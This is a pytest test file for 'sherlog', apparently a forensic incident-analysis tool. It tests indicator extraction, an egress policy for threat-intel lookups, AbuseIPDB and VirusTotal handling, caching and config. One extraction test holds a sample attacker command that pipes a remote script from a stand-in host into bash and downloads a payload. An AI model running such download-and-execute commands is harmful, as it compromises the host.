"""IOC extraction, egress policy, providers, cache/rate limits, enrich service, config, CLI."""

from __future__ import annotations

import json
import os
import stat
from datetime import timedelta
from pathlib import Path
from typing import Any

import pytest
from sqlalchemy import select
from typer.testing import CliRunner

from sherlog.cli import app
from sherlog.core.case import CaseHandle
from sherlog.core.config import (
    dump_toml,
    get_setting,
    load_config_file,
    mask,
    set_setting,
    unset_setting,
)
from sherlog.core.errors import ConfigError
from sherlog.core.models import IOC, AuditEntry
from sherlog.core.vocab import IOCType, Verdict
from sherlog.detection.engine import analyze_case
from sherlog.enrichment.cache import EnrichmentCache, QuotaExhausted, RateLimiter
from sherlog.enrichment.extract import extract_from_record, extract_iocs, is_internal_domain
from sherlog.enrichment.geoip import open_geoip
from sherlog.enrichment.policy import blocked_reason
from sherlog.enrichment.providers import AbuseIPDB, VirusTotal, combine_verdicts
from sherlog.enrichment.service import enrich_case, list_iocs
from sherlog.intake.service import add_evidence
from sherlog.reporting.context import build_context
from sherlog.reporting.render import render_markdown
from tests.helpers import PUBLIC_IP, build_incident

runner = CliRunner()


def rec(**kw: Any) -> dict[str, Any]:
    base: dict[str, Any] = {"id": 1, "raw": "", "tags": [], "extra": {}}
    base.update(kw)
    return base


def kinds(r: dict[str, Any]) -> set[tuple[str, str]]:
    return {(k.value, v) for k, v, _ in extract_from_record(r)}


# --- extraction -------------------------------------------------------------------------------


def test_extract_ips_and_private_tag() -> None:
    out = extract_from_record(rec(src_ip="10.0.0.5", dst_ip="8.8.8.8", raw="from 127.0.0.1"))
    got = {(k.value, v, t) for k, v, t in out}
    assert ("ipv4", "10.0.0.5", "src_ip") in got and ("ipv4", "10.0.0.5", "private") in got
    assert ("ipv4", "8.8.8.8", "dst_ip") in got and ("ipv4", "8.8.8.8", "private") not in got
    assert not any(v == "127.0.0.1" for _, v, _ in got)  # loopback dropped


def test_extract_ipv4_boundaries() -> None:
    assert ("ipv4", "1.2.3.4") in kinds(rec(raw="conn 1.2.3.4:22"))
    assert not kinds(rec(raw="version 1.2.3.4.5 and 999.1.1.1"))


def test_extract_urls_domains_hashes_paths() -> None:
    cmd = (
        "curl -s http://evil.example.com/p.sh | bash; wget ftp://198.51.100.20/x -O /tmp/.x/run.sh;"
        " echo e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855; ping c2.badhost.ru"
    )
    got = kinds(rec(command=cmd, raw=cmd))
    assert ("url", "http://evil.example.com/p.sh") in got
    assert ("domain", "evil.example.com") in got
    assert ("domain", "c2.badhost.ru") in got
    assert ("ipv4", "198.51.100.20") in got
    assert ("sha256", "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855") in got
    assert ("path", "/tmp/.x/run.sh") in got


def test_extract_avoids_false_positives() -> None:
    got = kinds(rec(command="chmod +x update.sh && python3 exploit.py && tail auth.log"))
    assert not any(k == "domain" for k, _ in got)
    # Hex in raw audit/journald records is not taken as a hash.
    raw_only = kinds(rec(raw="_BOOT_ID=0123456789abcdef0123456789abcdef proctitle=6E63002D65"))
    assert not any(k in ("md5", "sha256") for k, _ in raw_only)


def test_extract_usernames() -> None:
    assert ("username", "backdoor") in kinds(rec(event_type="user.create", target="backdoor"))
    added = rec(event_type="group.modify", target="eve", tags=["group:sudo"])
    assert ("username", "eve") in kinds(added)
    assert not kinds(rec(event_type="group.modify", target="eve", tags=["group:users"]))


def test_internal_domains() -> None:
    assert is_internal_domain("db01")
    assert is_internal_domain("files.corp")
    assert is_internal_domain("git.acme.example", ("acme.example",))
    assert not is_internal_domain("evil.example.com")


@pytest.fixture
def analyzed(case: CaseHandle, tmp_path: Path) -> CaseHandle:
    add_evidence(case, build_incident(tmp_path / "evidence", PUBLIC_IP))
    analyze_case(case, gap_threshold=timedelta(hours=6))
    return case


def test_analyze_extracts_and_links_iocs(analyzed: CaseHandle) -> None:
    rows = {(i["type"], i["value"]): i for i in list_iocs(analyzed, all_iocs=True)}
    brute = rows[("ipv4", PUBLIC_IP)]
    assert brute["finding_ids"] and brute["event_count"] >= 12
    assert ("username", "backdoor") in rows
    assert ("url", "http://198.51.100.20/x.sh") in rows
    linked = list_iocs(analyzed)
    assert linked and all(i["finding_ids"] for i in linked)


def test_reextract_keeps_enrichment(analyzed: CaseHandle) -> None:
    with analyzed.session() as s:
        ioc = s.scalars(select(IOC).where(IOC.value == PUBLIC_IP)).one()
        ioc.enrichment = {"abuseipdb": {"status": "ok"}}
        ioc.verdict = Verdict.MALICIOUS
        ioc_id = ioc.id
    extract_iocs(analyzed)
    with analyzed.session() as s:
        again = s.scalars(select(IOC).where(IOC.value == PUBLIC_IP)).one()
        assert again.id == ioc_id and again.verdict == Verdict.MALICIOUS
        assert again.enrichment == {"abuseipdb": {"status": "ok"}}


# --- policy -----------------------------------------------------------------------------------


def test_egress_policy() -> None:
    assert blocked_reason(IOCType.USERNAME, []) is not None
    assert blocked_reason(IOCType.PATH, []) is not None
    assert blocked_reason(IOCType.URL, []) is not None
    assert blocked_reason(IOCType.DOMAIN, ["internal"]) == "internal domain"
    assert "private" in (blocked_reason(IOCType.IPV4, ["private"]) or "")
    assert blocked_reason(IOCType.IPV4, ["private"], enrich_private=True) is None
    assert blocked_reason(IOCType.IPV4, ["src_ip"]) is None
    assert blocked_reason(IOCType.SHA256, ["command"]) is None


# --- providers --------------------------------------------------------------------------------


@pytest.mark.parametrize(
    ("score", "reports", "verdict"),
    [(90, 50, "malicious"), (40, 5, "suspicious"), (0, 0, "unknown"), (5, 3, "clean")],
)
def test_abuseipdb_verdicts(score: int, reports: int, verdict: str) -> None:
    body = {"data": {"abuseConfidenceScore": score, "totalReports": reports, "countryCode": "NL"}}
    v, summary = AbuseIPDB("k").summarize(body)
    assert v.value == verdict and summary["country"] == "NL"


@pytest.mark.parametrize(
    ("stats", "verdict"),
    [
        ({"malicious": 5, "suspicious": 0, "harmless": 60, "undetected": 20}, "malicious"),
        ({"malicious": 1, "suspicious": 0, "harmless": 60, "undetected": 20}, "suspicious"),
        ({"malicious": 0, "suspicious": 0, "harmless": 60, "undetected": 20}, "clean"),
        ({}, "unknown"),
    ],
)
def test_virustotal_verdicts(stats: dict[str, int], verdict: str) -> None:
    body = {"data": {"attributes": {"last_analysis_stats": stats}}}
    assert VirusTotal("k").summarize(body)[0].value == verdict


def test_provider_requests() -> None:
    url, headers = AbuseIPDB("secret").request(IOCType.IPV4, "203.0.113.9")
    assert url.startswith("https://api.abuseipdb.com/api/v2/check?ipAddress=203.0.113.9")
    assert headers["Key"] == "secret"
    url, headers = VirusTotal("vt").request(IOCType.SHA256, "ab" * 32)
    assert url == f"https://www.virustotal.com/api/v3/files/{'ab' * 32}"
    assert headers == {"x-apikey": "vt"}
    assert (
        VirusTotal("vt")
        .request(IOCType.DOMAIN, "evil.example.com")[0]
        .endswith("/domains/evil.example.com")
    )


def test_combine_verdicts() -> None:
    assert combine_verdicts([]) == Verdict.UNKNOWN
    assert combine_verdicts([Verdict.CLEAN, Verdict.SUSPICIOUS]) == Verdict.SUSPICIOUS
    assert combine_verdicts([Verdict.UNKNOWN, Verdict.CLEAN]) == Verdict.CLEAN


# --- cache and rate limiting ------------------------------------------------------------------


class Clock:
    def __init__(self) -> None:
        self.now = 1_000_000.0
        self.slept: list[float] = []

    def __call__(self) -> float:
        return self.now

    def sleep(self, seconds: float) -> None:
        self.slept.append(seconds)
        self.now += seconds


def test_cache_ttl(tmp_path: Path) -> None:
    clock = Clock()
    cache = EnrichmentCache(tmp_path / "c.db", clock=clock)
    cache.put("vt", "ipv4", "1.2.3.4", 200, {"a": 1})
    assert cache.get("vt", "ipv4", "1.2.3.4", ttl_seconds=60).body == {"a": 1}  # type: ignore[union-attr]
    clock.now += 61
    assert cache.get("vt", "ipv4", "1.2.3.4", ttl_seconds=60) is None
    cache.close()


def test_rate_limiter_spacing_and_quota(tmp_path: Path) -> None:
    clock = Clock()
    cache = EnrichmentCache(tmp_path / "c.db", clock=clock)
    limiter = RateLimiter("vt", cache, min_interval=15, daily_limit=3, sleep=clock.sleep)
    limiter.acquire()
    limiter.acquire()
    assert clock.slept == [15]
    limiter.acquire()
    with pytest.raises(QuotaExhausted):
        limiter.acquire()
    clock.now += 86401  # a day later the window has rolled over
    limiter.acquire()
    cache.close()


# --- enrich service ---------------------------------------------------------------------------


class FakeHTTP:
    """Records every request; answers based on the URL."""

    def __init__(self, overrides: dict[str, tuple[int, Any]] | None = None) -> None:
        self.calls: list[str] = []
        self.overrides = overrides or {}

    def __call__(self, url: str, headers: dict[str, str], timeout: float) -> tuple[int, Any]:
        self.calls.append(url)
        for fragment, answer in self.overrides.items():
            if fragment in url:
                return answer
        if "abuseipdb" in url:
            return 200, {
                "data": {"abuseConfidenceScore": 100, "totalReports": 42, "countryCode": "RU"}
            }
        stats = {"malicious": 7, "suspicious": 1, "harmless": 50, "undetected": 30}
        return 200, {"data": {"attributes": {"last_analysis_stats": stats}}}


@pytest.fixture
def keys(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setenv("SHERLOG_ABUSEIPDB_KEY", "abuse-key")
    monkeypatch.setenv("SHERLOG_VIRUSTOTAL_KEY", "vt-key")


def _enrich(case: CaseHandle, tmp_path: Path, http: FakeHTTP, **kw: Any) -> dict[str, Any]:
    clock = Clock()
    cache = EnrichmentCache(tmp_path / "enrich.db", clock=clock)
    try:
        return enrich_case(case, http_get=http, cache=cache, sleep=clock.sleep, **kw)
    finally:
        cache.close()


def test_enrich_live_then_cached(analyzed: CaseHandle, tmp_path: Path, keys: None) -> None:
    http = FakeHTTP()
    first = _enrich(analyzed, tmp_path, http)
    assert first["lookups"].get("live", 0) >= 2
    assert http.calls
    # Only public indicators were ever requested.
    for url in http.calls:
        assert "backdoor" not in url and "/tmp/" not in url and "x.sh" not in url
    brute = next(i for i in list_iocs(analyzed) if i["value"] == PUBLIC_IP)
    assert brute["verdict"] == "malicious"
    assert brute["enrichment"]["abuseipdb"]["summary"]["total_reports"] == 42
    with analyzed.session() as s:
        raw = s.scalars(select(IOC).where(IOC.value == PUBLIC_IP)).one().enrichment
        assert raw["virustotal"]["raw"]["data"]  # raw response retained

    http2 = FakeHTTP()
    second = _enrich(analyzed, tmp_path, http2)
    assert http2.calls == [] and second["lookups"].get("cache", 0) >= 2

    with analyzed.session() as s:
        entry = s.scalars(select(AuditEntry).where(AuditEntry.action == "enrich")).first()
        assert entry is not None and entry.details["calls"]


def test_enrich_offline_makes_no_calls(analyzed: CaseHandle, tmp_path: Path, keys: None) -> None:
    http = FakeHTTP()
    result = _enrich(analyzed, tmp_path, http, offline=True)
    assert http.calls == []
    assert all("offline" in s for s in result["providers"].values())
    assert result["lookups"].get("skipped", 0) > 0


def test_enrich_without_keys_is_cache_only(analyzed: CaseHandle, tmp_path: Path) -> None:
    http = FakeHTTP()
    result = _enrich(analyzed, tmp_path, http)
    assert http.calls == []
    assert all("no API key" in s for s in result["providers"].values())


def test_private_ips_blocked_unless_allowed(case: CaseHandle, tmp_path: Path, keys: None) -> None:
    ev = tmp_path / "internal"
    (ev / "var/log").mkdir(parents=True)
    lines = [
        f"2024-05-01T02:00:{i:02d}+00:00 h sshd[{i}]: Failed password for root "
        f"from 10.0.0.66 port {4000 + i} ssh2"
        for i in range(12)
    ]
    (ev / "var/log/auth.log").write_text("\n".join(lines) + "\n")
    add_evidence(case, ev)
    analyze_case(case, gap_threshold=timedelta(hours=6))

    http = FakeHTTP()
    result = _enrich(case, tmp_path, http)
    assert http.calls == [] and result["lookups"].get("blocked", 0) >= 1
    ioc = next(i for i in list_iocs(case) if i["value"] == "10.0.0.66")
    assert "private" in ioc["enrichment"]["egress"]["blocked"]

    http2 = FakeHTTP()
    _enrich(case, tmp_path, http2, enrich_private=True, refresh=True)
    assert any("10.0.0.66" in u for u in http2.calls)


def test_http_errors_stop_provider(analyzed: CaseHandle, tmp_path: Path, keys: None) -> None:
    http = FakeHTTP(
        {"abuseipdb": (429, {"errors": [{"detail": "Too many"}]}), "virustotal": (401, None)}
    )
    result = _enrich(analyzed, tmp_path, http)
    assert result["providers"]["abuseipdb"].startswith("stopped: rate limited")
    assert result["providers"]["virustotal"].startswith("stopped: authentication")
    # Each provider was called at most once before stopping.
    assert sum("abuseipdb" in u for u in http.calls) == 1
    assert sum("virustotal" in u for u in http.calls) == 1


def test_not_found_is_unknown(analyzed: CaseHandle, tmp_path: Path, keys: None) -> None:
    http = FakeHTTP(
        {
            "virustotal": (404, {"error": {"code": "NotFoundError"}}),
            "abuseipdb": (200, {"data": {"abuseConfidenceScore": 0, "totalReports": 0}}),
        }
    )
    _enrich(analyzed, tmp_path, http)
    brute = next(i for i in list_iocs(analyzed) if i["value"] == PUBLIC_IP)
    assert brute["enrichment"]["virustotal"]["status"] == "not_found"
    assert brute["verdict"] == "unknown"


def test_report_shows_intel(analyzed: CaseHandle, tmp_path: Path, keys: None) -> None:
    _enrich(analyzed, tmp_path, FakeHTTP())
    ctx = build_context(analyzed, verify=False)
    row = next(i for i in ctx["iocs"] if i["value"] == PUBLIC_IP)
    assert row["verdict"] == "malicious" and "AbuseIPDB 100%" in row["intel"]
    md = render_markdown(ctx)
    assert "AbuseIPDB 100% (42 reports)" in md
    assert ctx["iocs"][0]["verdict"] == "malicious"  # most severe first


def test_geoip_unavailable_reasons(tmp_path: Path) -> None:
    assert open_geoip(None)[1] and "no GeoIP" in open_geoip(None)[1]  # type: ignore[operator]
    reader, reason = open_geoip(str(tmp_path / "missing.mmdb"))
    assert reader is None and reason and "not found" in reason


# --- config -----------------------------------------------------------------------------------


def test_config_precedence_and_types(
    isolated_config: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    assert get_setting("enrichment.cache_ttl_hours") == 24.0  # default
    set_setting("enrichment.cache_ttl_hours", "6")
    assert get_setting("enrichment.cache_ttl_hours") == 6.0  # file
    set_setting("enrichment.virustotal_key", "file-key")
    monkeypatch.setenv("VT_API_KEY", "env-key")
    assert get_setting("enrichment.virustotal_key") == "env-key"  # env beats file
    assert get_setting("enrichment.virustotal_key", "cli-key") == "cli-key"  # CLI beats env
    set_setting("offline", "yes")
    assert get_setting("offline") is True
    set_setting("enrichment.internal_domains", "corp.example, lab.example")
    assert get_setting("enrichment.internal_domains") == ["corp.example", "lab.example"]
    with pytest.raises(ConfigError):
        set_setting("offline", "maybe")
    with pytest.raises(ConfigError):
        set_setting("no.such.key", "1")


def test_config_file_is_private(isolated_config: Path) -> None:
    set_setting("enrichment.abuseipdb_key", "s3cr3t-key")
    assert stat.S_IMODE(os.stat(isolated_config).st_mode) == 0o600
    assert load_config_file()["enrichment"]["abuseipdb_key"] == "s3cr3t-key"
    assert unset_setting("enrichment.abuseipdb_key") is True
    assert unset_setting("enrichment.abuseipdb_key") is False
    assert mask("abcdefgh") == "****efgh"


def test_dump_toml_roundtrip(tmp_path: Path) -> None:
    import tomllib

    data = {"offline": True, "cases_dir": 'a "b"', "enrichment": {"x": 1.5, "l": ["a", "b"]}}
    assert tomllib.loads(dump_toml(data)) == data


# --- CLI --------------------------------------------------------------------------------------


def test_cli_config_enrich_iocs(tmp_path: Path, isolated_config: Path) -> None:
    r = runner.invoke(app, ["config", "set", "enrichment.virustotal_key", "abcd1234efgh"])
    assert r.exit_code == 0 and "abcd1234efgh" not in r.output and "efgh" in r.output
    r = runner.invoke(app, ["config", "show", "--json"])
    shown = {s["key"]: s for s in json.loads(r.output)["settings"]}
    assert shown["enrichment.virustotal_key"]["value"].endswith("efgh")
    assert shown["enrichment.virustotal_key"]["source"] == "file"
    assert "abcd1234" not in r.output

    cases = tmp_path / "cases"
    evidence = build_incident(tmp_path / "evidence", PUBLIC_IP)
    for args in (
        ["case", "new", "c1"],
        ["evidence", "add", "c1", str(evidence)],
        ["analyze", "c1"],
    ):
        assert runner.invoke(app, ["--cases-dir", str(cases), *args]).exit_code == 0
    r = runner.invoke(app, ["--cases-dir", str(cases), "enrich", "c1", "--offline", "--json"])
    assert r.exit_code == 0, r.output
    data = json.loads(r.output)
    assert data["offline"] is True and data["iocs"]
    r = runner.invoke(app, ["--cases-dir", str(cases), "iocs", "c1", "--all", "--json"])
    assert any(i["value"] == PUBLIC_IP for i in json.loads(r.output))
